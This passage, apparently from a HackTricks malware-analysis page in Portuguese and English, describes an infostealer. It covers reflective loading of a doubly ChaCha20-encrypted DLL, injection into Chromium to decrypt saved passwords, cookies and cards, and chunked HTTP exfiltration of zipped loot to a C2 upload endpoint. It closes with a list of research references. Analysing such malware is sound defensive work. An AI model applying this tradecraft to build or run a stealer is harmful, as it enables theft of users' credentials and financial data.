- That helper stores a second-stage DLL encrypted twice with ChaCha20 (two 32-byte keys + 12-byte nonces). After both passes, it reflectively loads the blob (no `LoadLibrary`) and calls exports `ChromeElevator_Initialize/ProcessAllBrowsers/Cleanup` derived from [ChromElevator](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption).
- The ChromElevator routines use direct-syscall reflective process hollowing to inject into a live Chromium browser, inherit AppBound Encryption keys, and decrypt passwords/cookies/credit cards straight from SQLite databases despite ABE hardening.


### Coleta modular em memória & exfil HTTP em chunks

- `create_memory_based_log` itera uma tabela global `memory_generators` de ponteiros de função e cria uma thread por módulo habilitado (Telegram, Discord, Steam, screenshots, documents, browser extensions, etc.). Cada thread grava resultados em buffers compartilhados e reporta sua contagem de arquivos após uma janela de join de ~45s.
- Quando finalizado, tudo é zipado com a biblioteca estaticamente linkada `miniz` como `%TEMP%\\Log.zip`. `ThreadPayload1` então dorme 15s e transmite o arquivo em chunks de 10 MB via HTTP POST para `http://<C2>:6767/upload`, spoofando um boundary de browser `multipart/form-data` (`----WebKitFormBoundary***`). Cada chunk adiciona `User-Agent: upload`, `auth: <build_id>`, opcional `w: <campaign_tag>`, e o último chunk anexa `complete: true` para que o C2 saiba que a remontagem foi concluída.

## References

- [Crystal Kit – blog](https://rastamouse.me/crystal-kit/)
- [Crystal-Kit – GitHub](https://github.com/rasta-mouse/Crystal-Kit)
- [Elastic – Call stacks, no more free passes for malware](https://www.elastic.co/security-labs/call-stacks-no-more-free-passes-for-malware)
- [Crystal Palace – docs](https://tradecraftgarden.org/docs.html)
- [simplehook – sample](https://tradecraftgarden.org/simplehook.html)
- [stackcutting – sample](https://tradecraftgarden.org/stackcutting.html)
- [Draugr – call-stack spoofing PIC](https://github.com/NtDallas/Draugr)

- [Unit42 – New Infection Chain and ConfuserEx-Based Obfuscation for DarkCloud Stealer](https://unit42.paloaltonetworks.com/new-darkcloud-stealer-infection-chain/)
- [Synacktiv – Should you trust your zero trust? Bypassing Zscaler posture checks](https://www.synacktiv.com/en/publications/should-you-trust-your-zero-trust-bypassing-zscaler-posture-checks.html)
- [Check Point Research – Before ToolShell: Exploring Storm-2603’s Previous Ransomware Operations](https://research.checkpoint.com/2025/before-toolshell-exploring-storm-2603s-previous-ransomware-operations/)
- [Hexacorn – DLL ForwardSideLoading: Abusing Forwarded Exports](https://www.hexacorn.com/blog/2025/08/19/dll-forwardsideloading/)
- [Windows 11 Forwarded Exports Inventory (apis_fwd.txt)](https://hexacorn.com/d/apis_fwd.txt)
- [Microsoft Docs – Known DLLs](https://learn.microsoft.com/windows/win32/dlls/known-dlls)
- [Microsoft – Protected Processes](https://learn.microsoft.com/windows/win32/procthread/protected-processes)
- [Microsoft – EKU reference (MS-PPSEC)](https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88)
- [Sysinternals – Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [CreateProcessAsPPL launcher](https://github.com/2x7EQ13/CreateProcessAsPPL)
- [Zero Salarium – Countering EDRs With The Backing Of Protected Process Light (PPL)](https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html)
- [Zero Salarium – Break The Protective Shell Of Windows Defender With The Folder Redirect Technique](https://www.zerosalarium.com/2025/09/Break-Protective-Shell-Windows-Defender-Folder-Redirect-Technique-Symlink.html)
- [Microsoft – mklink command reference](https://learn.microsoft.com/windows-server/administration/windows-commands/mklink)

- [Check Point Research – Under the Pure Curtain: From RAT to Builder to Coder](https://research.checkpoint.com/2025/under-the-pure-curtain-from-rat-to-builder-to-coder/)
- [Rapid7 – SantaStealer is Coming to Town: A New, Ambitious Infostealer](https://www.rapid7.com/blog/post/tr-santastealer-is-coming-to-town-a-new-ambitious-infostealer-advertised-on-underground-forums)
- [ChromElevator – Chrome App Bound Encryption Decryption](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption)
- [Check Point Research – GachiLoader: Defeating Node.js Malware with API Tracing](https://research.checkpoint.com/2025/gachiloader-node-js-malware-with-api-tracing/)

{{#include ../banners/hacktricks-training.md}}
